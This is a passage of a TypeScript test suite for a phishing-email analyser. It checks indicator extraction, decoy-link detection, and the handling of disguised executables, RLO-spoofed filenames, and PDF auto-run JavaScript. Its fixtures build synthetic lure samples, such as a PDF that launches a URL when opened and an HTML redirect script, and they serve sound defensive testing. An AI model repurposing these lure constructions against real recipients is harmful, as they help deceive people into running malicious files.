    const md = formatPhishReport(await analysePhishing(mail, [], []))
    const outsideCode = md.replace(/^(`{3,})\n[\s\S]*?\n\1$/gm, '').replace(/(`+)[\s\S]*?\1/g, '')
    expect(md).toContain('beacon.test')
    expect(outsideCode).not.toMatch(/<[a-z!/?]/i)
    expect(outsideCode).not.toMatch(/!\[(?!\[)/)
  })
})

describe('Indicators and the case are one list', () => {
  const htmlOnly = (body: string): string =>
    `From: a@sender.test\nTo: b@corp.test\nSubject: hi\nContent-Type: text/html\n\n${body}\n`

  it('reads the words of an HTML-only mail for indicators, as it does a plain-text one', async () => {
    // The reply-to address a lure asks for was in what the victim read and in no indicator.
    const mail = htmlOnly(
      '<p>Hi, send the receipt to <b>billing@acme-payments.xyz</b>.</p><p>Or pay at portal acme-payments.xyz, server 203.0.113.9</p>'
    )
    const report = await analysePhishing(mail, [], [])
    for (const line of [
      'email: billing[at]acme-payments[.]xyz',
      'domain: acme-payments[.]xyz',
      'ip: 203[.]0[.]113[.]9'
    ]) {
      expect(report.indicators).toContain(line)
    }
    const values = caseIocs(report, mail).map((i) => i.value)
    expect(values).toEqual(expect.arrayContaining(['billing@acme-payments.xyz', 'acme-payments.xyz', '203.0.113.9']))
  })

  it('never lists the host of an anchor’s decoy text as a domain', async () => {
    const mail = htmlOnly('<a href="https://evil.test/x">https://www.paypal.com/signin</a>')
    const report = await analysePhishing(mail, [], [])
    expect(report.indicators.join('\n')).not.toContain('paypal')
    expect(caseIocs(report, mail).map((i) => i.value)).not.toContain('www.paypal.com')
  })

  it('names a decoy host written without a scheme, and keeps it on the case saying what it is', async () => {
    const mail = htmlOnly(
      '<p>Sign in at <a href="https://evil.test/x">www.paypal.com</a> or <a href="https://evil.test/y">paypal.com/signin</a>.</p>' +
        '<p>Mail <a href="mailto:billing@acme-payments.xyz">billing@acme-payments.xyz</a>, or get <a href="https://cdn.test/a/invoice.pdf">invoice.pdf</a></p>'
    )
    const report = await analysePhishing(mail, [], [])
    const flags = (raw: string): string[] | undefined => report.links.find((l) => l.raw === raw)?.flags
    expect(flags('https://evil.test/x')).toEqual(['shown as a link to www.paypal.com, points at evil.test'])
    expect(flags('https://evil.test/y')).toEqual(['shown as a link to paypal.com, points at evil.test'])
    // A file name is not a host, and an address shown over its own mailto: is still an indicator.
    expect(flags('https://cdn.test/a/invoice.pdf')).toEqual([])
    const iocs = caseIocs(report, mail)
    // The brand or a lookalike of it, which only the analyst can tell apart: kept, and said to be display text.
    expect(iocs.find((i) => i.value === 'www.paypal.com')?.note).toBe(
      "shown as a link's text; the link points at evil.test"
    )
    expect(iocs.map((i) => i.value)).toContain('billing@acme-payments.xyz')
  })

  it('does not call a link shown as its own site a decoy, and keeps a lookalike shown over a short link', async () => {
    const mail = htmlOnly(
      '<p><a href="https://www.brandmail.com/">brandmail.com</a> and <a href="https://bit.ly/x">royalmail-redelivery.com</a></p>'
    )
    const report = await analysePhishing(mail, [], [])
    const flags = (raw: string): string[] | undefined => report.links.find((l) => l.raw === raw)?.flags
    expect(flags('https://www.brandmail.com/')).toEqual([])
    expect(flags('https://bit.ly/x')).toEqual(['shown as a link to royalmail-redelivery.com, points at bit.ly'])
    expect(caseIocs(report, mail).map((i) => i.value)).toContain('royalmail-redelivery.com')
  })

  it('calls a link a decoy when it is shown as another site on the same shared host', async () => {
    const mail = htmlOnly(
      '<p><a href="https://evil.sharepoint.com/x">contoso.sharepoint.com</a> <a href="https://paypal.com.evil.test/">paypal.com</a> <a href="https://click.brand.test/r">brand.test</a></p>'
    )
    const report = await analysePhishing(mail, [], [])
    const flags = (raw: string): string[] | undefined => report.links.find((l) => l.raw === raw)?.flags
    expect(flags('https://evil.sharepoint.com/x')).toContain(
      'shown as a link to contoso.sharepoint.com, points at evil.sharepoint.com'
    )
    expect(flags('https://paypal.com.evil.test/')).toContain(
      'shown as a link to paypal.com, points at paypal.com.evil.test'
    )
    expect(flags('https://click.brand.test/r')).toEqual([])
  })

  it('keeps two links whose paths differ only in case, in both lists', async () => {
    // bit.ly paths are case-sensitive; the case compared them lower-cased and
    // dropped the PDF's link the Indicators tab listed.
    const statement = ascii(pdf('<< /Type /Catalog >>', '<< /A << /S /URI /URI (https://bit.ly/3xKq) >> >>'))
    const mail = mailWith(attached('statement.pdf', statement, 'application/pdf')).replace(
      'see attached',
      'Pay here https://bit.ly/3XkQ today'
    )
    const report = await analysePhishing(mail, [], [])
    const iocs = caseIocs(report, mail)
    expect(iocs).toContainEqual({ type: 'url', value: 'https://bit.ly/3XkQ' })
    expect(iocs).toContainEqual({ type: 'url', value: 'https://bit.ly/3xKq', note: 'inside statement.pdf' })
    const lines = iocs.map((i) => formatIocLine({ type: i.type, value: i.value }, []))
    expect(new Set(lines)).toEqual(new Set(report.indicators))
  })

  it('keeps one row for a hash written in upper case in the body, noted where it was hashed', async () => {
    const bytes = ascii('MZ payload')
    const digest = await hashBytes(bytes)
    const mail = mailWith(attached('a.bin', bytes)).replace('see attached', `hash ${digest.toUpperCase()}`)
    const report = await analysePhishing(mail, [], [])
    const hashes = caseIocs(report, mail).filter((i) => i.type === 'hash')
    expect(hashes).toHaveLength(1)
    expect(hashes[0].note).toBe('a.bin (hashed here)')
    expect(report.indicators.filter((l) => l.startsWith('hash: '))).toHaveLength(1)
  })

  it('stays quick on a long run of hyphens in the HTML text', async () => {
    const started = Date.now()
    const report = await analysePhishing(htmlOnly(`<p>${'a-'.repeat(54_000)}</p>`), [], [])
    caseIocs(report, '')
    expect(Date.now() - started).toBeLessThan(2000)
  })
})

describe('what the parts’ own headers and bytes say', () => {
  it('files a picture sent as an attachment as one, Content-ID or not', async () => {
    // Gmail's shape: an attachment disposition and a Content-ID. It was filed as
    // an inline image, and the report said "Attachments: None."
    const mail = mailWith({
      headers: [
        'Content-Type: image/png; name="qr.png"',
        'Content-Disposition: attachment; filename="qr.png"',
        'Content-ID: <f_m1abc>',
        'X-Attachment-Id: f_m1abc'
      ],
      bytes: new Uint8Array([...PNG, ...ascii(' https://qr-lure.example.test/login ')])
    })
    const report = await analysePhishing(mail, [], [])
    expect(report.attachments.map((a) => a.filename)).toEqual(['qr.png'])
    expect(report.inlineImages).toHaveLength(0)
    const md = formatPhishReport(report)
    expect(md).not.toContain('### Attachments\n\nNone.')
    expect(md).toContain('  - found inside the file: `url: hxxps://qr-lure[.]example[.]test/login`')
    expect(report.attachments[0].facts).toContain('marked inline or given a Content-ID by its own headers')
  })

  it('checks the sender’s domain as written, not as its encoded words decode', async () => {
    // Decoded first, a quote in an encoded word turned a comment into the
    // address, and the look-alike domain the mail came from was never checked.
    const mail =
      'From: =?utf-8?q?PayPal_=22?= <attacker@paypa1.com> (=?utf-8?q?=22?=<service@paypal.com>)\n' +
      'Return-Path: <service@paypal.com>\nContent-Type: text/plain\n\nhi\n'
    const report = await analysePhishing(mail, [], ['paypal'])
    expect(report.senderFacts).toContain('reads as "paypal" once look-alike characters are folded')
  })

  it('reads the headers of a paste that begins with blank lines', async () => {
    const mail =
      '\n\nReceived: from mx.evil.example (mx.evil.example [203.0.113.5])\n\tby mx.corp.test; Thu, 24 Sep 2026 08:02:11 +0000\n' +
      'From: phisher@evil.example\nSubject: hi\nContent-Type: text/plain\n\nhello\n'
    const report = await analysePhishing(mail, [], [])
    const values = caseIocs(report, mail).map((i) => i.value)
    expect(values).toContain('203.0.113.5')
    expect(values).toContain('phisher@evil.example')
    // A paste of a body alone, opening on a blank line, is still a body.
    const body = await analysePhishing('\nClick http://evil.test/a now\n\nThanks', [], [])
    expect(body.links.map((l) => l.target)).toEqual(['http://evil.test/a'])
    // Millions of them are skipped by a search, not a repeated-group regex that overflows the stack.
    const padded = await analysePhishing(`${'\n'.repeat(5_000_000)}From: phisher@evil.example\n\nhi`, [], [])
    expect(padded.indicators).toContain('email: phisher[at]evil[.]example')
  })

  it('says a quoted-printable file with hard line breaks was rebuilt from its text', async () => {
    // A hard break stands for CRLF, which the reader has already turned into
    // LF: the hash was of no file anyone sent, and nothing said so.
    const mail = [
      'From: a@sender.test',
      'Content-Type: multipart/mixed; boundary="B"',
      '',
      '--B',
      'Content-Type: text/html; name="pay.html"',
      'Content-Disposition: attachment; filename="pay.html"',
      'Content-Transfer-Encoding: quoted-printable',
      '',
      '<html>',
      '<script>location=3D"https://evil.test"</script>',
      '</html>',
      '--B--',
      ''
    ].join('\n')
    const report = await analysePhishing(mail, [], [])
    const [a] = report.attachments
    expect(a.exact).toBe(false)
    expect(a.facts).toContain(REBUILT_FACT)
    expect(caseIocs(report, mail).find((i) => i.value === a.sha256)?.note).toBe(
      'pay.html (hashed here from its text as read; may not match the file as sent)'
    )
    // A base64 file is the file as sent, and says nothing of the kind.
    const [plain] = (await analysePhishing(mailWith(attached('a.bin', ascii('MZ'))), [], [])).attachments
    expect(plain.exact).toBe(true)
    expect(plain.facts).not.toContain(REBUILT_FACT)
  })

  it('counts an RTF’s objects past the part the preview shows', async () => {
    // Past the first 20,000 characters an Equation Editor object was stated nowhere.
    const rtf = ascii(
      `{\\rtf1\\ansi ${'padding '.repeat(3000)}{\\object\\objemb\\objupdate{\\*\\objclass Equation.3}{\\*\\objdata 0105000002000000}}}`
    )
    const report = await analysePhishing(mailWith(attached('Remittance.rtf', rtf, 'application/rtf')), [], [])
    const census = report.attachments[0].facts.find((f) => f.startsWith('RTF object and DDEAUTO markers found:')) ?? ''
    expect(census).toContain('\\objdata ×1')
    expect(census).toContain('the first \\objclass reads Equation.3')
    expect(formatPhishReport(report)).toContain('RTF object and DDEAUTO markers found: \\object ×1')
  })
})

describe('end to end, on the fixes the readers made', () => {
  it('catches a program named as a picture inside an archive by its bytes', async () => {
    const pe = new Uint8Array(200)
    pe.set([0x4d, 0x5a, 0x90, 0x00])
    const other = pe.slice()
    other[199] = 1
    const bytes = zip([
      { name: 'Invoice.jpg', data: pe },
      { name: 'photo.jfif', data: other }
    ])
    const mail = mailWith(attached('files.zip', bytes, 'application/zip'))
    const report = await analysePhishing(mail, [], [])
    const digest = await hashBytes(pe)
    const lines = structureLines(report.attachments[0])
    expect(lines).toContain(
      `  - inner file \`Invoice.jpg\`: named .jpg but the bytes begin as Windows executable (MZ); SHA-256 ${digest} (computed here)`
    )
    expect(lines).toContain(
      `  - inner file \`photo.jfif\`: named .jfif but the bytes begin as Windows executable (MZ); SHA-256 ${await hashBytes(other)} (computed here)`
    )
    expect(lines.join('\n')).not.toContain('embedded picture')
    expect(report.indicators).toContain(`hash: ${digest}`)
    expect(caseIocs(report, mail)).toContainEqual({
      type: 'hash',
      value: digest,
      note: 'Invoice.jpg inside files.zip (hashed here)'
    })
  })

  it('reads a filename folded into two encoded words as the one name a client shows', async () => {
    const mail = mailWith({
      headers: [
        'Content-Type: application/octet-stream',
        'Content-Disposition: attachment; filename="=?UTF-8?B?aW52b2ljZS5w?= =?UTF-8?B?ZGYuZXhl?="'
      ],
      bytes: ascii('MZ')
    })
    const [a] = (await analysePhishing(mail, [], [])).attachments
    expect(a.filename).toBe('invoice.pdf.exe')
    expect(a.facts).toContain(
      'double extension — the name ends .pdf.exe; with the last extension hidden it reads as .pdf'
    )
  })

  it('reads a URL in prose up to the sentence around it, in the links, the indicators and the case', async () => {
    const mail =
      'From: a@sender.test\nContent-Type: text/plain\n\nPlease sign in at “https://login.evil-portal.test/verify” today. Or https://x.test/verify.\n'
    const report = await analysePhishing(mail, [], [])
    expect(report.links.map((l) => l.target).sort()).toEqual([
      'https://login.evil-portal.test/verify',
      'https://x.test/verify'
    ])
    expect(report.indicators).toContain('url: hxxps://login[.]evil-portal[.]test/verify')
    const urls = caseIocs(report, mail)
      .filter((i) => i.type === 'url')
      .map((i) => i.value)
    expect(urls.sort()).toEqual(['https://login.evil-portal.test/verify', 'https://x.test/verify'])
    // Bytes that do not decode end a URL inside a file too.
    const bytes = new Uint8Array([...ascii('xx http://evil.example.com/stage'), 0xff, 0xfe, ...ascii('AB')])
    const [a] = (await analysePhishing(mailWith(attached('x.bin', bytes)), [], [])).attachments
    expect(a.inside).toContain('url: hxxp://evil[.]example[.]com/stage')
  })

  it('shows every format character a sender wrote as its code, outside the message body', async () => {
    const rlo = '‮'
    const docx = zip([
      { name: '[Content_Types].xml', data: ascii('<Types/>') },
      { name: `word/_rels/${rlo}slmx.document.xml.rels`, data: ascii('xx'), flags: 1 }
    ])
    const mail = [
      `From: "Pay${rlo}lap" <a@evil.test>`,
      'Subject: files',
      'MIME-Version: 1.0',
      'Content-Type: multipart/mixed; boundary="B"',
      '',
      '--B',
      'Content-Type: text/html',
      '',
      '<a href="https://micro­soft-login.test/verify">sign in</a>',
      '--B',
      `Content-Type: application/${rlo}exe.fdp; name="scan.pdf"`,
      'Content-Disposition: attachment; filename="scan.pdf"',
      'Content-Transfer-Encoding: base64',
      '',
      base64(ascii('%PDF-1.7\n')),
      '--B',
      `Content-Type: image/${rlo}gnp; name="report.docx"`,
      'Content-Disposition: attachment; filename="report.docx"',
      'Content-Transfer-Encoding: base64',
      '',
      base64(docx),
      '--B',
      'Content-Type: application/octet-stream',
      'Content-Disposition: attachment; filename="=?utf-8?Q?Invoice=E2=80=AEfdp.exe?="',
      'Content-Transfer-Encoding: base64',
      '',
      '!!!!',
      '--B--',
      ''
    ].join('\n')
    const md = formatPhishReport(await analysePhishing(mail, [], []))
    const outsideFences = md.replace(/^(`{3,})\n[\s\S]*?\n\1$/gm, '')
    expect(outsideFences.split('\n').filter((l) => /\p{Cf}/u.test(l))).toEqual([])
    for (const shown of [
      'Pay<U+202E>lap',
      'application/<U+202E>exe.fdp',
      'image/<U+202E>gnp',
      'word/_rels/<U+202E>slmx.document.xml.rels',
      'Invoice<U+202E>fdp.exe',
      'micro<U+00AD>soft-login'
    ]) {
      expect(outsideFences).toContain(shown)
    }
  })
})

// ─── The PDF object read, end to end ────────────────────────────────────────

const HELVETICA = '<< /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >> >>'
const LURE_TEXT = 'Your invoice is ready: https://pay-lure.test/inv'
/** Everything that acts is packed in object stream 10, where the byte scan cannot see it. */
const LURE_MEMBERS = [
  { num: 1, body: '<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>' },
  { num: 2, body: '<< /Type /Pages /Kids [3 0 R] /Count 1 >>' },
  {
    num: 3,
    body: '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 7 0 R >> >> /Contents 4 0 R /Annots [6 0 R] >>'
  },
  { num: 5, body: '<< /S /JavaScript /JS (app.launchURL\\("https://js-lure.test/a"\\);) >>' },
  {
    num: 6,
    body: '<< /Type /Annot /Subtype /Link /Rect [0 0 100 100] /A << /S /URI /URI (https://objstm-lure.test/login) >> >>'
  },
  { num: 7, body: '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>' }
]
const LURE = buildPdf(
  [
    objStm(10, LURE_MEMBERS),
    { num: 4, body: '<< >>', stream: `BT /F1 12 Tf 72 700 Td (${LURE_TEXT}) Tj ET`, flate: true }
  ],
  { xrefStream: true }
)

/** A PDF whose pages draw these strings, one page each, in Helvetica. */
function pagesOf(...texts: string[]): Uint8Array {
  const objects: Obj[] = [
    { num: 1, body: '<< /Type /Catalog /Pages 2 0 R >>' },
    {
      num: 2,
      body: `<< /Type /Pages /Kids [${texts.map((_, i) => `${3 + 2 * i} 0 R`).join(' ')}] /Count ${texts.length} >>`
    }
  ]
  texts.forEach((text, i) => {
    objects.push(
      {
        num: 3 + 2 * i,
        body: `<< /Type /Page /Parent 2 0 R /Resources << /Font ${HELVETICA} >> /Contents ${4 + 2 * i} 0 R >>`
      },
      { num: 4 + 2 * i, body: '<< >>', stream: `BT /F1 12 Tf 72 700 Td (${text}) Tj ET`, flate: true }
    )
  })
  return buildPdf(objects)
}

const pdfMail = (name: string, bytes: Uint8Array): string => mailWith(attached(name, bytes, 'application/pdf'))

/** The one note a PDF gets when words beside a gap were left out of its indicators. */
const gapNote = (n: number): string =>
  `${n} word(s) next to a place where this reader skipped or could not read part of the drawing (or cut a value or script) were left out of the indicators, since what is left of a word there can name another address; where the text is quoted, […] marks the place.`

/** The indicators a report's case carries from PDF page text, form fields and scripts. */
const fromText = (iocs: { note?: string }[]): number =>
  iocs.filter((i) => /^in (the text of page|invisible text|a form field|JavaScript)/.test(i.note ?? '')).length

describe('a PDF read for its objects and page text', () => {
  it('adds the packed link, the page text and the script to the case, each saying where it was read', async () => {
    const mail = pdfMail('lure.pdf', LURE)
    const report = await analysePhishing(mail, [], [])
    const iocs = caseIocs(report, mail)
    expect(iocs).toContainEqual({ type: 'url', value: 'https://objstm-lure.test/login', note: 'inside lure.pdf' })
    expect(iocs).toContainEqual({
      type: 'url',
      value: 'https://pay-lure.test/inv',
      note: 'in the text of page 1 of lure.pdf, as decoded here'
    })
    expect(iocs).toContainEqual({ type: 'url', value: 'https://js-lure.test/a', note: 'in JavaScript inside lure.pdf' })
    expect(report.indicators).toContain('url: hxxps://objstm-lure[.]test/login')
    expect(report.indicators).toContain('url: hxxps://pay-lure[.]test/inv')
  })

  it('reads JavaScript for addresses only, so `this.info` is not listed as a domain', async () => {
    const bytes = buildPdf([
      { num: 1, body: '<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>' },
      { num: 2, body: '<< /Type /Pages /Kids [] /Count 0 >>' },
      { num: 5, body: '<< /S /JavaScript /JS 6 0 R >>' },
      { num: 6, body: '<< >>', stream: 'var d = this.info; app.launchURL("https://js-only.test/x");', flate: true }
    ])
    const mail = pdfMail('form.pdf', bytes)
    const iocs = caseIocs(await analysePhishing(mail, [], []), mail)
    expect(iocs).toContainEqual({ type: 'url', value: 'https://js-only.test/x', note: 'in JavaScript inside form.pdf' })
    expect(iocs.some((i) => i.value === 'this.info')).toBe(false)
  })

  it('quotes the page and the script in their own section, between the message body and the indicators', async () => {
    const report = await analysePhishing(pdfMail('lure.pdf', LURE), [], [])
    const md = formatPhishReport(report)
    const heading = '### Attachment text — decoded here, never rendered or run'
    expect(md.indexOf('### Message body')).toBeLessThan(md.indexOf(heading))
    expect(md.indexOf(heading)).toBeLessThan(md.indexOf('### Indicators'))
    expect(md).toContain(`Page 1 of \`lure.pdf\`, as its fonts decode it:\n\n\`\`\`\n${LURE_TEXT}\n\`\`\``)
    expect(md).toContain(
      'JavaScript in `lure.pdf`, object 5, packed in object stream 10, not run:\n\n```script\napp.launchURL("https://js-lure.test/a");\n```'
    )
    const lines = structureLines(report.attachments[0])
    expect(lines).toContain(
      '  - PDF action `/JavaScript` when the document opens (/OpenAction) (object 5, packed in object stream 10)'
    )
    expect(lines).toContain(
      '  - PDF link (/URI), object 6, packed in object stream 10, on page 1: `hxxps://objstm-lure[.]test/login`'
    )
    expect(lines).toContain(
      "  - PDF page text: of 1 page(s) read whole, 1 drew text this reader could decode (the document declares 1) — quoted under Attachment text below, up to that section's 150,000-character limit"
    )
    // No PDF, no section: an ordinary mail's report is as it was.
    expect(formatPhishReport(await analysePhishing(MAIL, [], []))).not.toContain(heading)
  })

  it('keeps hostile page text inside one fence, every invisible character named', async () => {
    // Code 1 maps to U+202E through the font's own /ToUnicode, which a reader trusts.
    const fonts =
      '<< /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding /ToUnicode 5 0 R >> >>'
    const cmap =
      'begincmap 1 begincodespacerange <00> <FF> endcodespacerange 1 beginbfchar <01> <202E> endbfchar endcmap'
    const bytes = onePage('BT /F1 12 Tf 72 700 Td (``` ![[secret]] <img src=x> \\001gpj.exe) Tj ET', {
      fonts,
      extra: [{ num: 5, body: '<< >>', stream: cmap }]
    })
    const md = formatPhishReport(await analysePhishing(pdfMail('hostile.pdf', bytes), [], []))
    expect(md).toMatch(/\n(`{4,})\n``` !\[\[secret\]\] <img src=x> <U\+202E>gpj\.exe\n\1\n/)
    expect(md).not.toContain('\u202E')
    const outsideFences = md.replace(/^(`{3,})\n[\s\S]*?\n\1$/gm, '')
    expect(outsideFences.split('\n').filter((l) => l.startsWith('![['))).toEqual([])
    expect(outsideFences).not.toContain('<img')
  })

  it('keeps invisible text and page objects outside the tree off the case, but not an OCR layer', async () => {
    // Nothing else on the page: invisible text alone, with no picture under it, is not an OCR layer.
    const hidden = onePage('BT 3 Tr /F1 12 Tf 72 700 Td (https://hidden-lure.test/x) Tj ET')
    const scan = onePage(
      'q 612 0 0 792 0 0 cm /Im1 Do Q BT 3 Tr /F1 12 Tf 72 700 Td (Pay at https://ocr.test/x) Tj ET',
      {
        fonts: `${HELVETICA} /XObject << /Im1 5 0 R >>`,
        extra: [
          {
            num: 5,
            body: '<< /Type /XObject /Subtype /Image /Width 1 /Height 1 /ColorSpace /DeviceGray /BitsPerComponent 8 >>',
            stream: '\xff',
            flate: true
          }
        ]
      }
    )
    const orphan = buildPdf([
      { num: 1, body: '<< /Type /Catalog /Pages 2 0 R >>' },
      { num: 2, body: '<< /Type /Pages /Kids [3 0 R] /Count 1 >>' },
      { num: 3, body: `<< /Type /Page /Parent 2 0 R /Resources << /Font ${HELVETICA} >> /Contents 4 0 R >>` },
      { num: 4, body: '<< >>', stream: 'BT /F1 12 Tf 72 700 Td (Tree page) Tj ET', flate: true },
      { num: 6, body: `<< /Type /Page /Resources << /Font ${HELVETICA} >> /Contents 7 0 R >>` },
      { num: 7, body: '<< >>', stream: 'BT /F1 12 Tf 72 700 Td (https://orphan-lure.test/x) Tj ET', flate: true }
    ])
    const mail = mailWith(
      attached('hidden.pdf', hidden, 'application/pdf'),
      attached('scan.pdf', scan, 'application/pdf'),
      attached('orphan.pdf', orphan, 'application/pdf')
    )
    const report = await analysePhishing(mail, [], [])
    const iocs = caseIocs(report, mail)
    expect(iocs.some((i) => i.value.includes('hidden-lure'))).toBe(false)
    expect(iocs.some((i) => i.value.includes('orphan-lure'))).toBe(false)
    expect(iocs.find((i) => i.value === 'https://ocr.test/x')?.note).toBe(
      'in invisible text on page 1 of scan.pdf (a page that draws a picture and no visible text this reader decoded: an OCR layer, or text hidden from the reader), as decoded here'
    )
    const md = formatPhishReport(report)
    expect(md).toContain(
      'Page 1 of `hidden.pdf`, drawn so a reader does not show it (invisible text mode, zero size, or a hidden annotation); the case takes no indicators from it:\n\n```no-indicators\nhttps://hidden-lure.test/x\n```'
    )
    expect(md).toContain(
      'Page 1 of `scan.pdf`, drawn invisibly on a page that draws a picture and no visible text this reader decoded — the shape text recognition (OCR) leaves on a scanned page, and also a way to hide text from a reader:'
    )
    expect(md).toContain(
      'A page object of `orphan.pdf` that the page tree read here does not list (object 6) — a reader following that tree does not show it; the case takes no indicators from it:\n\n```no-indicators\nhttps://orphan-lure.test/x\n```'
    )
    expect(md).toContain(
      '  - PDF pictures drawn on page 1: `/FlateDecode` 1×1 (object 5), stored `/FlateDecode`: not shown here'
    )
  })

  it('points a picture a page draws at the image extracted from the same stream', async () => {
    const jpeg = Uint8Array.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0xff, 0xd9])
    const bytes = onePage('q 100 0 0 100 0 0 cm /Im1 Do Q', {
      fonts: `${HELVETICA} /XObject << /Im1 5 0 R >>`,
      extra: [
        { num: 5, body: '<< /Type /XObject /Subtype /Image /Width 1 /Height 1 /Filter /DCTDecode >>', stream: jpeg }
      ]
    })
    const lines = structureLines((await analysePhishing(pdfMail('qr.pdf', bytes), [], [])).attachments[0])
    const picture = lines.find((l) => l.startsWith('  - PDF pictures drawn on page 1: '))
    const at = /shown below as the picture at byte (\d+)$/.exec(picture ?? '')?.[1]
    expect(picture).toBe(
      `  - PDF pictures drawn on page 1: \`/DCTDecode\` 1×1 (object 5), shown below as the picture at byte ${at}`
    )
    // Below it, as the line says.
    const image = lines.findIndex((l) => l.startsWith(`  - embedded picture \`byte ${at} (/DCTDecode)\`: JPEG image`))
    expect(image).toBeGreaterThan(lines.indexOf(picture ?? ''))
  })

  it('says a page drawn only in fonts it could not decode was not decoded, and fences none of it', async () => {
    const bytes = onePage('BT /F1 12 Tf 72 700 Td <000100020003> Tj ET', {
      fonts:
        '<< /F1 << /Type /Font /Subtype /Type0 /BaseFont /Mystery /Encoding /Identity-H /DescendantFonts [5 0 R] >> >>',
      extra: [
        {
          num: 5,
          body: '<< /Type /Font /Subtype /CIDFontType2 /BaseFont /Mystery /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> /DW 1000 >>'
        }
      ]
    })
    const report = await analysePhishing(pdfMail('glyphs.pdf', bytes), [], [])
    const md = formatPhishReport(report)
    expect(md).toContain(
      '### Attachment text — decoded here, never rendered or run\n\nPage 1 of `glyphs.pdf`: 3 characters drawn in fonts this reader could not decode.\n\n### Indicators'
    )
    expect(structureLines(report.attachments[0])).toContain(
      '  - PDF page text: of 1 page(s) read whole, 0 drew text this reader could decode (the document declares 1)'
    )
  })

  it('adds at most 100 indicators from one file’s text and 500 from one message’s, and counts the rest', async () => {
    const urls = (tag: string): string => Array.from({ length: 150 }, (_, i) => `https://${tag}-${i}.test/p`).join(' ')
    const one = pdfMail('links.pdf', onePage(`BT /F1 12 Tf 72 700 Td (${urls('one')}) Tj ET`))
    const single = await analysePhishing(one, [], [])
    expect(fromText(caseIocs(single, one))).toBe(100)
    expect(single.attachments[0].pdf?.notes).toContain(
      "50 further indicator(s) found in this PDF's page text, form fields or JavaScript are not added to the case from this file (one also found elsewhere in the message can be in it from there): this reader adds at most 100 per file and 500 per message."
    )
    const six = mailWith(
      ...Array.from({ length: 6 }, (_, n) =>
        attached(`links${n}.pdf`, onePage(`BT /F1 12 Tf 72 700 Td (${urls(`f${n}`)}) Tj ET`), 'application/pdf')
      )
    )
    const report = await analysePhishing(six, [], [])
    expect(fromText(caseIocs(report, six))).toBe(500)
    expect(report.attachments[5].pdf?.notes.join(' ')).toContain('150 further indicator(s) found in this PDF')
  })

  it('reads three megabytes of script for addresses quickly, and still adds only 100', async () => {
    // Each script is read whole for indicators (up to 1 MiB), not just the part quoted.
    const script = (n: number): string =>
      Array.from({ length: 24_000 }, (_, i) => `var u${i} = "https://s${n}-${i}.test/p"; `).join('')
    const bytes = buildPdf([
      { num: 1, body: '<< /Type /Catalog /Pages 2 0 R /OpenAction [5 0 R 6 0 R 7 0 R] >>' },
      { num: 2, body: '<< /Type /Pages /Kids [] /Count 0 >>' },
      ...[5, 6, 7].map((num) => ({ num, body: `<< /S /JavaScript /JS ${num + 10} 0 R >>` })),
      ...[15, 16, 17].map((num) => ({ num, body: '<< >>', stream: script(num), flate: true }))
    ])
    const mail = pdfMail('heavy.pdf', bytes)
    const at = performance.now()
    const report = await analysePhishing(mail, [], [])
    // About 0.3 s alone. The ceiling catches a blow-up, not a slow or busy
    // runner: at 2 s it failed under a loaded suite on slower cores.
    expect(performance.now() - at).toBeLessThan(10_000)
    expect(report.attachments[0].pdf?.parsed?.scripts.map((s) => s.source.length)).toEqual([
      script(15).length,
      script(16).length,
      script(17).length
    ])
    expect(fromText(caseIocs(report, mail))).toBe(100)
  })

  it('keeps an encrypted file’s /URI strings off the case, and says they are stored encrypted', async () => {
    const bytes = buildPdf(
      [
        { num: 1, body: '<< /Type /Catalog /Pages 2 0 R >>' },
        { num: 2, body: '<< /Type /Pages /Kids [3 0 R] /Count 1 >>' },
        { num: 3, body: '<< /Type /Page /Parent 2 0 R /Annots [6 0 R] >>' },
        { num: 6, body: '<< /Type /Annot /Subtype /Link /A << /S /URI /URI (https://cipher-lure.test/x) >> >>' },
        { num: 30, body: '<< /Filter /Standard /V 2 /R 3 >>' }
      ],
      { trailer: '/Encrypt 30 0 R' }
    )
    const mail = pdfMail('locked.pdf', bytes)
    const report = await analysePhishing(mail, [], [])
    const [a] = report.attachments
    // The byte scan reads it; the bytes are ciphertext, whatever they look like.
    expect(a.pdf?.uris).toEqual(['https://cipher-lure.test/x'])
    expect(caseIocs(report, mail).some((i) => i.value.includes('cipher-lure'))).toBe(false)
    expect(a.inside.some((l) => l.includes('cipher-lure'))).toBe(false)
    const lines = structureLines(a)
    expect(lines[0]).toBe('  - PDF 1.7, encrypted (its trailer names /Encrypt)')
    expect(lines).toContain(
      '  - PDF /URI string, stored encrypted — not what a reader shows: `hxxps://cipher-lure[.]test/x`'
    )
    expect(lines.some((l) => l.startsWith('  - PDF link'))).toBe(false)
  })

  it('types and hashes an embedded file read whole, and puts its hash in the case', async () => {
    const exe = `MZ${'\x90'.repeat(100)}`
    const bytes = buildPdf([
      { num: 1, body: '<< /Type /Catalog /Pages 2 0 R >>' },
      { num: 2, body: '<< /Type /Pages /Kids [] /Count 0 >>' },
      { num: 8, body: '<< /Type /Filespec /UF (invoice.pdf) /F (invoice.exe.) /EF << /F 9 0 R >> >>' },
      { num: 9, body: '<< /Type /EmbeddedFile /Params << /Size 1234 >> >>', stream: exe, flate: true }
    ])
    const sha = await hashBytes(Uint8Array.from(exe, (c) => c.charCodeAt(0)))
    const mail = pdfMail('lure.pdf', bytes)
    const report = await analysePhishing(mail, [], [])
    expect(caseIocs(report, mail)).toContainEqual({
      type: 'hash',
      value: sha,
      note: 'invoice.pdf inside lure.pdf (hashed here)'
    })
    const [file] = report.attachments[0].pdf?.parsed?.embeddedFiles ?? []
    // The report keeps what it is, not the file.
    expect(Object.keys(file).sort()).toEqual(['mismatch', 'name', 'names', 'sha256', 'size', 'sniffed', 'where'])
    expect(structureLines(report.attachments[0])).toContain(
      `  - PDF embedded file \`invoice.pdf\` (also named \`invoice.exe.\`): 1234 bytes declared; named like an executable or script; named .pdf but the bytes begin as Windows executable (MZ); SHA-256 ${sha} (computed here); not opened here (object 8)`
    )
  })

  it('reads no PDF data past the message budget, and says which budget', async () => {
